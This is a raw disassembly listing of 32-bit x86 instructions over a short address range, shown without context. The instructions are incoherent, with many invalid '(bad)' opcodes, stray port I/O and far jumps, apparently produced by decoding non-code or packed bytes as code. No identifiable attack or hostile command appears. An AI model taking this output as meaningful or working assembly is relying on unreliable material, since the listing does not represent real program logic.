  41858e:	mov    edi,0xd88820b8
  418593:	mov    eax,ds:0x3b22c6ad
  418598:	test   al,0x4e
  41859a:	dec    eax
  41859b:	int    0x21
  41859d:	dec    eax
  41859e:	pop    ss
  41859f:	push   eax
  4185a0:	dec    ecx
  4185a1:	xor    al,0x2d
  4185a3:	jp     0x418546
  4185a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4185a6:	sbb    DWORD PTR [edx-0x18],0x4d
  4185aa:	les    ebx,FWORD PTR [ebx+0x12]
  4185ad:	cmp    BYTE PTR [eax-0x8ffec35],bh
  4185b3:	(bad)  [edi-0x3f]
  4185b6:	pop    es
  4185b7:	mov    al,0xc7
  4185b9:	jbe    0x418570
  4185bb:	in     eax,0xfe
  4185bd:	sbb    al,0x54
  4185bf:	lds    esp,FWORD PTR [ecx]
  4185c1:	out    0xcd,al
  4185c3:	mov    al,ds:0xb1af6e94
  4185c8:	cmp    DWORD PTR [esi-0x3652b15c],0xffffff97
  4185cf:	fmul   DWORD PTR [eax-0x3a]
  4185d2:	clc    
  4185d3:	mov    bh,0x2a
  4185d5:	sub    BYTE PTR [eax+edi*1-0x290c514e],dl
  4185dc:	or     al,BYTE PTR [ecx-0x7a3772a]
  4185e2:	test   BYTE PTR [ecx+0x68008b6c],cl
  4185e8:	pop    ebp
  4185e9:	push   ebp
  4185ea:	inc    edx
  4185eb:	es dec edx
  4185ed:	push   ds
  4185ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4185ef:	or     ch,BYTE PTR [edx-0x5e8b0f3d]
  4185f5:	add    eax,0x6da4cca3
  4185fa:	mov    bh,0xaf
  4185fc:	xor    eax,0xcb1b8e38
  418601:	in     eax,0x6
  418603:	or     esi,eax
  418605:	(bad)  
  418607:	lods   eax,DWORD PTR ds:[esi]
  418608:	iret   
  418609:	cmp    al,0x5c
  41860b:	mov    ebp,0xdc046085
  418610:	add    bl,dl
  418612:	aad    0x1d
  418614:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418615:	test   DWORD PTR [esi],edi
  418617:	stos   BYTE PTR es:[edi],al
  418618:	sar    DWORD PTR [ecx],1
  41861a:	cwde   
  41861b:	sbb    eax,DWORD PTR [edx]
  41861d:	inc    DWORD PTR [edx-0xdcff6c6]
  418623:	jno    0x4185e6
  418625:	pushw  cs
  418627:	push   ds
  418628:	xchg   esp,eax
  418629:	in     al,0x23
  41862b:	jb     0x418618
  41862d:	sub    dl,dh
  41862f:	xor    ah,bh
  418631:	sbb    esi,DWORD PTR [edi+0x2a48f739]
  418637:	mov    bl,ah
  418639:	(bad)  
  41863a:	lods   eax,DWORD PTR ds:[esi]
  41863b:	jge    0x418686
  41863d:	inc    ebx
  41863e:	in     eax,0xfa
  418640:	outs   dx,BYTE PTR ds:[esi]
  418641:	sbb    BYTE PTR [esi],ch
  418643:	enter  0x13d7,0x7c
  418647:	sub    al,0xd1
  418649:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41864a:	fnsave [ebp+0x5e8dd327]
  418650:	iret   
  418651:	test   eax,0x5f89e266
  418656:	jmp    0x41ea:0x10992ca4
  41865d:	jp     0x4186a8
  41865f:	ja     0x4186b4
  418661:	dec    esi
  418662:	xor    ebx,esi
  418664:	or     cl,BYTE PTR [ebx-0x5080b891]
  41866a:	out    dx,al
  41866b:	mov    ebx,0x591ad45a
  418670:	dec    ax
  418672:	jmp    0x294440a4
  418677:	leave  
  418678:	mov    bh,0xf1
  41867a:	adc    ch,BYTE PTR [edi-0x22]
  41867d:	push   es
  41867e:	outs   dx,BYTE PTR fs:[esi]
  418680:	adc    esp,edx
  418682:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418683:	mov    eax,?
  418685:	pop    edx
  418686:	sbb    dh,dl
  418688:	clc    
  418689:	cmp    ebx,eax
  41868b:	mov    ebp,0x8597ae7f
  418690:	fcmovne st,st(1)
  418692:	mov    ecx,0x447ddf2c
  418697:	in     eax,0x98
  418699:	icebp  
  41869a:	mov    edi,esi
  41869c:	sub    DWORD PTR [edi+0x30d9db05],ecx
  4186a2:	push   ebp
  4186a3:	loopne 0x4186ab
  4186a5:	cwde   
  4186a6:	loop   0x418666
  4186a8:	enter  0x46dd,0x22
  4186ac:	dec    ecx
  4186ad:	adc    al,BYTE PTR [ecx+0x536b8692]
  4186b3:	mov    al,0x6
  4186b5:	mov    esi,0xa8f3276d
  4186ba:	sub    eax,0x481246d3
  4186bf:	sti    
  4186c0:	xchg   ebx,eax
  4186c1:	jb     0x4186eb
  4186c3:	cmp    eax,0x402a1add
  4186c8:	cld    
  4186c9:	push   0x3f
  4186cb:	sbb    DWORD PTR [ebx-0x7205fdb0],edi
  4186d1:	dec    ecx
  4186d2:	rcr    BYTE PTR [edi+0x67],1
  4186d5:	pop    eax
  4186d6:	jle    0x4186db
  4186d8:	gs push edx
  4186da:	mov    WORD PTR ds:0x21244847,gs
  4186e0:	cld    
  4186e1:	loopne 0x4186f4
  4186e3:	add    bh,BYTE PTR [ebx-0x1c]
  4186e6:	shl    BYTE PTR [edi],0x10
  4186e9:	shl    BYTE PTR [ecx+0x37],cl
  4186ec:	test   BYTE PTR [eax+0x4],0xb
  4186f0:	sbb    al,0x51
  4186f2:	pop    ss
  4186f3:	outs   dx,BYTE PTR ds:[esi]
  4186f4:	push   esi
  4186f5:	or     ecx,DWORD PTR [edi+eiz*2]
  4186f8:	adc    esi,ebx
  4186fa:	test   BYTE PTR [ecx],al
  4186fc:	movnti DWORD PTR [esi-0xd9b943f],esp
  418703:	jecxz  0x4186dd
  418705:	cwde   
  418706:	push   0x1d
  418708:	ret    0xf63b
  41870b:	adc    dl,ch
  41870d:	dec    ebp
  41870e:	stos   BYTE PTR es:[edi],al
  41870f:	sub    DWORD PTR es:[ebp+edx*4+0x10],0x2cfedba0
  418718:	mov    al,0x7
  41871a:	xchg   edx,eax
  41871b:	jl     0x418742
  41871d:	test   BYTE PTR [ecx-0x27],ch
  418720:	and    esp,0x1b9d3235
  418726:	mov    esp,0x5edd84aa
  41872b:	xor    ebp,DWORD PTR [esi+0x7e731627]
  418731:	lahf   
  418732:	mov    dl,0x37
  418734:	cmp    BYTE PTR [edi],bl
  418736:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418737:	lea    esp,[eax-0x38]
  41873a:	pop    edx
  41873b:	shr    BYTE PTR [eax+0x2d7b8793],0xdc
  418742:	ins    DWORD PTR es:[edi],dx
  418743:	fwait
  418744:	pop    edi
  418745:	lods   eax,DWORD PTR ds:[esi]
  418746:	outs   dx,DWORD PTR ds:[esi]
  418747:	inc    ebp
  418748:	and    DWORD PTR [ecx-0x65],ecx
  41874b:	lea    esp,[ecx-0x74]
  41874e:	shr    ebp,1
  418750:	into   
  418751:	pop    ebx
  418752:	and    dh,BYTE PTR [ebx+ebp*1-0x38]
  418756:	dec    ebp
  418757:	popa   
  418758:	shr    BYTE PTR [edx+0x50],0x41
  41875c:	pop    ds
  41875d:	xor    BYTE PTR [esp+esi*4+0x32],bl
  418761:	dec    edi
  418762:	out    0xb2,eax
  418764:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418765:	sub    al,0xbf
  418767:	jecxz  0x418790
  418769:	mov    ch,0x3b
  41876b:	xlat   BYTE PTR ds:[ebx]
  41876c:	pop    eax
  41876d:	mov    ebx,0xe4e906b4
  418772:	std    
  418773:	nop
  418774:	fidiv  WORD PTR ds:0xe474988e
  41877a:	xor    al,0x44
  41877c:	sbb    bl,ah
  41877e:	into   
  41877f:	jnp    0x418771
  418781:	xchg   edi,eax
  418782:	push   eax
  418783:	xchg   ebp,eax
  418784:	adc    eax,0x593a9e10
  418789:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41878a:	inc    ebp
  41878b:	sbb    bl,ch
  41878d:	loope  0x418766
  41878f:	cmp    DWORD PTR [edi-0x5a],ebp
  418792:	sar    cl,1
  418794:	push   0x827bb1d4
  418799:	xchg   edi,eax
  41879a:	in     al,dx
  41879b:	mov    edx,0x193b9f16
  4187a0:	push   ebp
  4187a1:	ja     0x4187dc
  4187a3:	or     eax,0xc3c5ff1e
  4187a8:	ret    
  4187a9:	fisttp WORD PTR [ebx-0x659206ad]
  4187af:	dec    ecx
  4187b0:	fild   QWORD PTR [eax]
  4187b2:	push   ebx
  4187b3:	adc    ah,dl
  4187b5:	loopne 0x418818
  4187b7:	scas   al,BYTE PTR es:[edi]
  4187b8:	in     eax,0xc0
  4187ba:	pop    ebp
  4187bb:	out    dx,al
  4187bc:	adc    DWORD PTR [edx+ecx*8+0x69af9325],edi
  4187c3:	or     eax,0xe833a6bd
  4187c8:	mov    bl,0xf2
  4187ca:	pop    esi
  4187cb:	sbb    dh,cl
  4187cd:	fidiv  DWORD PTR [edi]
  4187cf:	push   ebp
  4187d0:	jae    0x41878e
  4187d2:	mov    cs,esp
  4187d4:	push   DWORD PTR [ecx+0x32]
  4187d7:	mov    eax,0xa69e1f6a
  4187dc:	mov    BYTE PTR [ebx+esi*1],bh
  4187df:	or     BYTE PTR [ecx+0x73153f8a],al
  4187e5:	jecxz  0x418862
  4187e7:	xlat   BYTE PTR ds:[ebx]
  4187e8:	cmp    eax,0xbe053d6
  4187ed:	cmp    al,0xa3
  4187ef:	pop    ecx
  4187f0:	pop    ecx
  4187f1:	push   es
  4187f2:	dec    edx
  4187f3:	inc    edi
  4187f4:	fsub   DWORD PTR [edi+ecx*8+0x658f5848]
  4187fc:	maskmovq mm2,(bad)
  4187fd:	not    DWORD PTR [ebx]
  4187ff:	fist   WORD PTR [edx]
  418801:	loope  0x418878
  418803:	cld    
  418804:	jb     0x418812
  418806:	push   edx
  418807:	imul   esp,DWORD PTR [eax],0xffffffd1
  41880a:	xor    eax,0x5341c144
  41880f:	adc    eax,0x81730dde
  418814:	rcr    ch,0xe9
  418817:	(bad)  
  418819:	jg     0x418809
  41881b:	mov    bl,0x32
  41881d:	int    0x33
  41881f:	add    DWORD PTR [eax+0x60934159],esi
  418825:	sub    eax,0x40f69ec8
  41882a:	into   
  41882b:	push   ebx
  41882c:	ss inc edx
  41882e:	pop    ecx
  41882f:	adc    ecx,DWORD PTR [esi+0xc482dcb]
  418835:	dec    edi
  418836:	sub    al,ah
  418838:	sti    
  418839:	jno    0x418825
  41883b:	adc    ecx,DWORD PTR [ecx-0x75]
  41883e:	pop    eax
  41883f:	sub    ebx,ebp
  418841:	rcr    DWORD PTR [esi-0x7e],0x7b
  418845:	bound  ebp,QWORD PTR [ecx+0x41]
  418848:	out    dx,eax
  418849:	xchg   ecx,eax
  41884a:	jmp    0x6c60:0xde377f6d
  418851:	dec    ebx
  418852:	data16 loope 0x418899
  418855:	and    BYTE PTR [edi+eax*2+0x5a],al
  418859:	inc    eax
  41885a:	mov    ds:0x3652f23f,al
  41885f:	adc    eax,0x73c3a9be
  418864:	fcmovbe st,st(4)
  418866:	dec    edi
  418867:	(bad)  [edi+eiz*4+0x3f46f8c2]
  41886e:	cmp    dh,dh
  418870:	mov    DWORD PTR [ebx],edi
  418872:	and    al,0xba
  418874:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418875:	mov    ebp,0xd2a226b5
  41887a:	add    DWORD PTR [edx+ecx*1+0x6e],edi
  41887e:	push   ebx
  41887f:	sub    bl,ah
  418881:	mov    ?,WORD PTR [eax]
  418883:	enter  0x2ddd,0x8e
  418887:	push   edx
  418888:	test   eax,0x5989b6f1
  41888d:	xchg   esi,eax
  41888e:	xlat   BYTE PTR ds:[ebx]
  41888f:	mov    dl,0xff
  418891:	sbb    DWORD PTR [esi-0x3e],eax
  418894:	hlt    
  418895:	jo     0x41882a
  418897:	and    dh,BYTE PTR [edi+edi*1]
  41889a:	mov    es,WORD PTR [eax-0x5d5dfe05]
  4188a0:	fidivr DWORD PTR [ebp+eax*4+0x2b]
  4188a4:	push   edi
  4188a5:	sbb    DWORD PTR [ebx],ecx
  4188a7:	fld    QWORD PTR [eax]
  4188a9:	xor    dl,BYTE PTR [ebp-0x140e0e53]
  4188af:	mov    cl,0xdb
  4188b1:	and    DWORD PTR [edi+0x57],ebx
  4188b4:	adc    dh,bl
  4188b6:	cmp    esp,DWORD PTR [ebp-0x4b69a460]
  4188bc:	sub    esi,esi
  4188be:	ins    BYTE PTR es:[edi],dx
  4188bf:	mov    al,ds:0x30d509b7
  4188c4:	ss (bad) 
  4188c6:	mov    ebp,0xed7932b
  4188cb:	adc    DWORD PTR [ecx-0x53],esp
  4188ce:	fistp  QWORD PTR [edx]
  4188d0:	cdq    
  4188d1:	rcr    DWORD PTR [eax],cl
  4188d3:	xor    DWORD PTR [edx],ecx
  4188d5:	aaa    
  4188d6:	add    DWORD PTR [edi+0x72],ebp
  4188d9:	retf   0xc66b
  4188dc:	xchg   eax,ecx
  4188de:	(bad)  
  4188e0:	sti    
  4188e1:	or     dl,BYTE PTR [esi+0x5e]
  4188e4:	add    dl,BYTE PTR [ebx+edx*2-0x52]
  4188e8:	cmp    al,0x6c
  4188ea:	pop    ss
  4188eb:	fiadd  WORD PTR [ebp+0x5f]
  4188ee:	sbb    DWORD PTR [edi+eiz*2],edx
  4188f1:	call   0x83b1:0xd3480df
  4188f8:	cmp    DWORD PTR ds:0x1a3bced2,0xf
  4188ff:	js     0x418924
  418901:	pop    edi
  418902:	nop
  418903:	pushf  
  418904:	shr    DWORD PTR [esi-0x7],0xcd
  418908:	pushf  
  418909:	mov    ds:0x23cadc07,al
  41890e:	jmp    0x56be:0x1818bf55
  418915:	arpl   WORD PTR [eax],di
  418917:	mov    al,BYTE PTR [ebp-0x61f071a7]
  41891d:	adc    DWORD PTR [ecx-0x774203e4],0x20
  418924:	les    ebx,FWORD PTR [edx+0x3976f14e]
  41892a:	push   ebx
  41892b:	call   0x88a:0xd8462a7e
  418932:	mov    edx,0xcf80e20f
  418937:	cli    
  418938:	mov    esi,DWORD PTR [esi-0x57]
  41893b:	sbb    esi,ebx
  41893d:	popa   
  41893e:	scas   eax,DWORD PTR es:[edi]
  41893f:	fwait
  418940:	in     al,dx
  418941:	jl     0x418990
  418943:	push   edx
  418944:	jbe    0x418985
  418946:	fldenv [ebx]
  418948:	out    dx,al
  418949:	inc    edx
  41894a:	shl    BYTE PTR [esi+eax*8-0x5a],1
  41894e:	cli    
  41894f:	mov    es,edx
  418951:	cmp    DWORD PTR [edx-0x6422e7b5],ecx
  418957:	jmp    0x8c72:0x694d2d66
  41895e:	ds stos DWORD PTR es:[edi],eax
  418960:	and    DWORD PTR [ebx],edx
  418962:	add    al,0xe3
  418964:	jno    0x41897c
  418966:	cmp    eax,0xe7844270
  41896b:	xchg   ebx,eax
  41896c:	bnd jge 0x41890d
  41896f:	mov    ebx,0x1d600e1d
  418974:	pushf  
  418975:	and    DWORD PTR [ebx-0x1bd1cc4],ebp
  41897b:	or     al,0xc1
  41897d:	mov    esp,0xbda69962
  418982:	xlat   BYTE PTR ds:[ebx]
  418983:	in     al,0xc8
  418985:	aas    
  418986:	xchg   edx,eax
  418987:	cli    
  418988:	or     eax,0x1eff375
  41898d:	mov    eax,ds:0x584fa183
  418992:	xchg   ch,cl
  418994:	xchg   esi,eax
  418995:	call   0x55a5:0xa1b5d9e2
  41899c:	dec    ebx
  41899d:	lods   al,BYTE PTR gs:[esi]
  41899f:	jge    0x418a06
  4189a1:	push   esi
  4189a2:	dec    ecx
  4189a3:	adc    DWORD PTR [edi-0x59cd9373],eax
  4189a9:	sub    eax,0x601391ef
  4189ae:	aas    
  4189af:	enter  0x21bd,0x25
  4189b3:	sahf   
  4189b4:	mov    es,WORD PTR [edi+0x7a2aafd2]
  4189ba:	(bad)  
  4189bb:	cs jno 0x418a0d
  4189be:	fcomi  st,st(4)
  4189c0:	leave  
  4189c1:	stc    
  4189c2:	nop
  4189c3:	ds mov ah,0x5b
  4189c6:	test   eax,0x89bfe2ff
  4189cb:	add    dh,al
  4189cd:	xor    DWORD PTR [esi-0x4ae5e8af],ecx
  4189d3:	test   BYTE PTR [edi],0x99
  4189d6:	imul   esp,esi,0x250b4da4
  4189dc:	dec    eax
  4189dd:	mov    ds:0x888c04aa,al
  4189e2:	sub    eax,0x5186a210
  4189e7:	cld    
  4189e8:	xor    dl,BYTE PTR [ebx+0x29]
  4189eb:	sub    DWORD PTR [ebx-0x6e6fd840],eax
  4189f1:	pop    edx
  4189f2:	sbb    ebx,ecx
  4189f4:	inc    ecx
  4189f5:	mov    bh,0x5d
  4189f7:	adc    DWORD PTR [eax-0x4b92b8fb],edi
  4189fd:	or     DWORD PTR [eax+0x26e8ede6],0x2249f334
  418a07:	and    dl,dl
  418a09:	sbb    esp,edi
  418a0b:	ins    BYTE PTR es:[edi],dx
  418a0c:	xchg   edi,eax
  418a0d:	jbe    0x418a27
  418a0f:	and    eax,0xff5cfb7
  418a14:	adc    eax,0x263fd63f
  418a19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418a1a:	xlat   BYTE PTR ds:[ebx]
  418a1b:	mov    WORD PTR cs:[eax+0x18],cs
  418a1f:	jo     0x418a36
  418a21:	add    eax,0x3bcb6130
  418a26:	rcl    dh,cl
  418a28:	jb     0x418a93
  418a2a:	daa    
  418a2b:	mov    cl,dh
  418a2d:	dec    edx
  418a2e:	rcr    BYTE PTR [ebx+0x3b],cl
  418a31:	jmp    0x92a9:0xae73da5a
  418a38:	lods   eax,DWORD PTR ds:[esi]
  418a39:	push   0xfffffffb
  418a3b:	int    0xd9
  418a3d:	ret    0x663e
  418a40:	fisub  WORD PTR [ebp-0x2ea4286]
  418a46:	cmp    eax,0x4c676d15
  418a4b:	mov    ebp,0xdc4e2328
  418a50:	pop    ss
  418a51:	cwde   
  418a52:	push   ds
  418a53:	ret    
  418a54:	pop    ebx
  418a55:	add    eax,0x32e99f7a
  418a5a:	addr16 fwait
  418a5c:	add    BYTE PTR [eax],bh
  418a5e:	inc    edx
  418a5f:	sub    DWORD PTR [eax+0x4a],edx
  418a62:	sbb    bh,BYTE PTR [esi+0x4f]
  418a65:	cmp    eax,0x7e89267d
  418a6a:	xchg   esp,eax
  418a6b:	sbb    esi,DWORD PTR [eax+0x7f]
  418a6e:	sar    BYTE PTR [edi+0x14],1
  418a71:	mov    ah,0xb0
  418a73:	enter  0x4507,0xd0
  418a77:	(bad)  
  418a78:	pop    ss
  418a79:	pop    es
  418a7a:	push   cs
  418a7b:	and    ch,0x55
  418a7e:	stc    
  418a7f:	fdiv   DWORD PTR [eax-0x6f]
  418a82:	push   eax
  418a83:	dec    ebx
  418a84:	cld    
  418a85:	push   ecx
  418a86:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418a87:	mov    bl,0x78
  418a89:	inc    ebp
  418a8a:	dec    eax
  418a8b:	int3   
  418a8c:	scas   al,BYTE PTR es:[edi]
  418a8d:	outs   dx,BYTE PTR ds:[esi]
  418a8e:	pop    esi
  418a8f:	call   FWORD PTR [eax-0x26f33a84]
  418a95:	mov    WORD PTR [ecx-0x926e0f6],?
  418a9b:	adc    DWORD PTR [ebx-0x346be80a],ebp
  418aa1:	ds cdq 
  418aa3:	shr    BYTE PTR [ecx+0x45e853e8],0x6c
  418aaa:	adc    eax,0xae9f231
  418aaf:	lock jl 0x418aa6
  418ab2:	mov    bl,BYTE PTR [edx]
  418ab4:	jno    0x418ac9
  418ab6:	and    eax,0x4e300bbd
  418abb:	adc    esi,DWORD PTR [ecx+ecx*1]
  418abe:	out    0xd3,al
  418ac0:	inc    ebx
  418ac1:	sbb    eax,0x708cbe38
  418ac6:	aad    0xe7
  418ac8:	xchg   BYTE PTR [edi],ch
  418aca:	sub    DWORD PTR gs:[ebp+0x6f2ffc05],ebp
  418ad1:	or     esi,DWORD PTR [edi-0x98aec42]
  418ad7:	jecxz  0x418b12
  418ad9:	mov    dl,0xfd
  418adb:	pop    esp
  418adc:	cdq    
  418add:	sub    edi,DWORD PTR [ebx-0x72]
  418ae0:	sub    eax,0x50626460
  418ae5:	xor    DWORD PTR [eax],eax
  418ae7:	push   ebp
  418ae8:	add    eax,0xadec61cf
  418aed:	sub    eax,0x367743a9
  418af2:	hlt    
  418af3:	fild   DWORD PTR [edx]
  418af5:	sbb    DWORD PTR [edi-0x2efddf73],esi
  418afb:	xchg   esi,eax
  418afc:	sub    ch,dl
  418afe:	loopne 0x418b58
  418b00:	jp     0x418b64
  418b02:	or     eax,esp
  418b04:	and    al,0xc6
  418b06:	clc    
  418b07:	dec    ecx
  418b08:	cmp    al,0xf0
  418b0a:	iret   
  418b0b:	jmp    0x418b14
  418b0d:	push   edi
  418b0e:	pop    esp
  418b0f:	fadd   DWORD PTR [esi-0x78755d05]
  418b15:	out    dx,eax
  418b16:	mov    dl,0x54
  418b18:	xchg   edi,eax
  418b19:	mov    BYTE PTR [ebx-0x4d950cb9],bh
  418b1f:	xor    eax,0xc04b21cd
  418b24:	add    eax,0xe5e22d73
  418b29:	fwait
  418b2a:	sti    
  418b2b:	cmp    BYTE PTR [edi+0x6d],cl
  418b2e:	jb     0x418b0b
  418b30:	aam    0x66
  418b32:	outs   dx,DWORD PTR ds:[esi]
  418b33:	sub    esp,edx
  418b35:	cdq    
  418b36:	or     ebp,0xffffffa2
  418b39:	addr16 sbb al,0x6e
  418b3c:	popf   
  418b3d:	retf   
  418b3e:	inc    BYTE PTR [ebp-0x1d5d3c22]
  418b44:	xchg   BYTE PTR [ebp+eiz*4-0x13],bl
  418b48:	adc    al,0x6a
  418b4a:	mov    ch,0x85
  418b4c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418b4d:	aas    
  418b4e:	mov    cl,0x35
  418b50:	imul   ebx,DWORD PTR [edx+0x2d5d26e9],0xf4b1892d
  418b5a:	add    dl,BYTE PTR [edx-0x53]
  418b5d:	inc    ebx
  418b5e:	mov    ?,edi
  418b60:	out    0xa9,eax
  418b62:	mov    ebx,0xb8b67671
  418b67:	mov    bh,0x49
  418b69:	daa    
  418b6a:	jae    0x418b15
  418b6c:	push   ebx
  418b6d:	inc    esp
  418b6e:	or     ecx,ecx
  418b70:	mov    dl,0x94
  418b72:	pushf  
  418b73:	addr16 push ss
  418b75:	stos   DWORD PTR es:[edi],eax
  418b76:	lods   eax,DWORD PTR ds:[esi]
  418b77:	mov    ebx,0x3fa1075c
  418b7c:	fistp  QWORD PTR [ebx-0x76d8352b]
  418b82:	add    DWORD PTR [eax],esi
  418b84:	nop
  418b85:	out    dx,al
  418b86:	push   ebp
  418b87:	add    edx,ecx
  418b89:	clc    
  418b8a:	sbb    al,0x61
  418b8c:	test   BYTE PTR [edx+0x29],0x55
  418b90:	mov    bl,0xcb
  418b92:	sbb    bh,ah
  418b94:	jb     0x418b23
  418b96:	icebp  
  418b97:	neg    BYTE PTR [edi-0x2dd1315]
  418b9d:	sbb    edx,0x4b
  418ba0:	js     0x418bb4
  418ba2:	dec    ebp
  418ba3:	dec    BYTE PTR [edi-0x512e1f30]
  418ba9:	in     al,0x73
  418bab:	jbe    0x418b55
  418bad:	cwde   
  418bae:	stos   BYTE PTR es:[edi],al
  418baf:	mov    edx,0xae715db8
  418bb4:	or     ebx,DWORD PTR [ecx+0x60c23534]
  418bba:	and    al,0xe5
  418bbc:	popf   
  418bbd:	mov    ecx,DWORD PTR [edi]
  418bbf:	call   0x6ab547b3
  418bc4:	xchg   ecx,eax
  418bc5:	push   0xe0271711
  418bca:	and    al,0x9a
  418bcc:	add    bh,BYTE PTR [ecx+0x5c]
  418bcf:	push   edx
  418bd0:	fbstp  TBYTE PTR [edx+0x48]
  418bd3:	inc    eax
  418bd4:	push   es
  418bd5:	test   bl,bl
  418bd7:	fs daa 
  418bd9:	push   0xb
  418bdb:	or     DWORD PTR [eax+0x640dfe10],ebx
  418be1:	fsubr  QWORD PTR [ebx-0x7b]
  418be4:	mov    bl,0x61
  418be6:	pop    ecx
  418be7:	xchg   esp,eax
  418be8:	cmp    ecx,DWORD PTR [ebp-0x3f680ca1]
  418bee:	xor    BYTE PTR [ebx+0x2787b16e],ah
  418bf4:	icebp  
  418bf5:	add    edi,DWORD PTR [ecx+0x492d41e6]
  418bfb:	sub    edi,DWORD PTR [ecx]
  418bfd:	scas   eax,DWORD PTR es:[edi]
  418bfe:	rcr    DWORD PTR [eax-0xe],0x91
  418c02:	mov    WORD PTR [eax],gs
  418c04:	xor    ecx,ebp
  418c06:	cs dec edi
  418c08:	add    ecx,DWORD PTR [esi]
  418c0a:	jmp    0x418ba6
  418c0c:	(bad)  
  418c0d:	mov    ch,bl
  418c0f:	seto   BYTE PTR [ecx]
  418c12:	mov    DWORD PTR [ebx+0x7b],edi
  418c15:	ins    DWORD PTR es:[edi],dx
  418c16:	xchg   ecx,eax
  418c17:	pop    eax
  418c18:	add    al,0xed
  418c1a:	xor    ch,BYTE PTR [eax-0x49]
  418c1d:	call   DWORD PTR [ebx]
  418c1f:	(bad)  
  418c20:	lods   eax,DWORD PTR ds:[esi]
  418c21:	dec    ebp
  418c22:	pop    esp
  418c23:	iret   
  418c24:	xor    al,0xd8
  418c26:	pop    ss
  418c27:	pop    esp
  418c28:	outs   dx,DWORD PTR ds:[esi]
  418c29:	add    al,0x2
  418c2b:	int3   
  418c2c:	popa   
  418c2d:	xor    eax,0x12904fd4
  418c32:	jbe    0x418c06
  418c34:	and    eax,0x9c2b8a8
  418c39:	jecxz  0x418c74
  418c3b:	xor    edx,esp
  418c3d:	mov    cl,0x76
  418c3f:	xchg   ebx,eax
  418c40:	arpl   di,sp
  418c42:	dec    ecx
  418c43:	in     al,dx
  418c44:	jmp    0xa288892
  418c49:	jb     0x418c01
  418c4b:	mov    ah,0x67
  418c4d:	stc    
  418c4e:	outs   dx,BYTE PTR ds:[esi]
  418c4f:	xor    esp,esp
  418c51:	neg    DWORD PTR [edx+0x68ec8bc4]
  418c57:	sub    eax,0xb39e03d2
  418c5c:	pushf  
  418c5d:	jbe    0x418c86
  418c5f:	mov    bh,0xac
  418c61:	push   esp
  418c62:	cwde   
  418c63:	adc    DWORD PTR [esi+0x4ba2c878],0x202926cb
  418c6d:	test   BYTE PTR [ebp-0x38],ah
  418c70:	or     ah,dh
  418c72:	sub    dh,BYTE PTR [edx+0x3c]
  418c75:	scas   eax,DWORD PTR es:[edi]
  418c76:	mov    bh,0x61
  418c78:	mov    ebp,edx
  418c7a:	(bad)  
  418c7c:	cmp    al,0xda
  418c7e:	pop    edx
  418c7f:	dec    edi
  418c80:	in     eax,dx
  418c81:	cli    
  418c82:	cmp    DWORD PTR [ebx+0x6c],ecx
  418c85:	(bad)  [eax]
  418c87:	pushf  
  418c88:	sbb    BYTE PTR [esi],ah
  418c8a:	xchg   ecx,eax
  418c8b:	xor    DWORD PTR [eax-0x5f0ee431],ebx
  418c91:	fidivr WORD PTR [edx-0x771c65f1]
  418c97:	aas    
  418c98:	sbb    eax,0xbb752b99
  418c9d:	cmp    ch,BYTE PTR [esi+0x45]
  418ca0:	pop    ebx
  418ca1:	fs leave 
  418ca3:	lods   al,BYTE PTR ds:[esi]
  418ca4:	jne    0x418cb7
  418ca6:	cmp    DWORD PTR [ebx+0x56],0x39
  418caa:	inc    esi
  418cab:	or     dl,BYTE PTR [edx+0x6ee38c3b]
  418cb1:	lock rol DWORD PTR [edi],0x93
  418cb5:	inc    ecx
  418cb6:	inc    eax
  418cb7:	sub    BYTE PTR [edi],bh
  418cb9:	adc    ecx,DWORD PTR [edx+eax*4]
  418cbc:	inc    ecx
  418cbd:	outs   dx,DWORD PTR ds:[esi]
  418cbe:	mov    ecx,0x89a45a66
  418cc3:	mov    edi,0xfb2d9b43
  418cc8:	shl    dh,0x67
  418ccb:	mov    edx,?
  418ccd:	xchg   ebp,eax
  418cce:	mov    ecx,0xeb5c0024
  418cd3:	ret    0x56a3
  418cd6:	mov    esp,0xad995954
  418cdb:	sbb    eax,0x501af5de
  418ce0:	push   eax
  418ce1:	or     ecx,DWORD PTR [ebx]
  418ce3:	adc    ch,BYTE PTR [eax-0x3]
  418ce6:	push   0x3b
  418ce8:	adc    ch,bl
  418cea:	xchg   ebx,eax
  418ceb:	and    eax,0xe1abcfce
  418cf0:	jge    0x418cf5
  418cf2:	mov    ds:0x87e51f5c,al
  418cf7:	lahf   
  418cf8:	mov    ebp,DWORD PTR [ecx-0x15]
  418cfb:	jns    0x418c94
  418cfd:	cmp    cl,ch
  418cff:	(bad)  
  418d00:	mov    dl,0x27
  418d02:	and    DWORD PTR [esi+edx*8-0x5e],edi
  418d06:	cmp    esi,DWORD PTR [esi-0x11f82ad0]
  418d0c:	xchg   edx,eax
  418d0d:	pop    ss
  418d0e:	and    BYTE PTR [edi],0x79
  418d11:	(bad)  
  418d12:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418d13:	dec    ebx
  418d14:	xor    ebx,DWORD PTR [edx+0x6acdfca0]
  418d1a:	loopne 0x418cd2
  418d1c:	icebp  
  418d1d:	in     eax,dx
  418d1e:	in     al,dx
  418d1f:	inc    ebx
  418d20:	xchg   ebx,eax
  418d21:	sub    al,0x4e
  418d23:	aas    
  418d24:	xchg   ecx,eax
  418d25:	xor    al,0x27
  418d27:	test   BYTE PTR [ebx+0x1f],dl
  418d2a:	adc    BYTE PTR [ebp-0x5e4f15a4],bl
  418d30:	inc    ebx
  418d31:	cmp    DWORD PTR [ebx-0x3204abfe],0xe31bbfe7
  418d3b:	int3   
  418d3c:	scas   eax,DWORD PTR es:[edi]
  418d3d:	sahf   
  418d3e:	mov    ds:0x2feece2d,eax
  418d43:	retf   0x37e2
  418d46:	or     ebx,ebp
  418d48:	mov    edx,0x2e1a665e
  418d4d:	outs   dx,BYTE PTR ds:[esi]
  418d4e:	std    
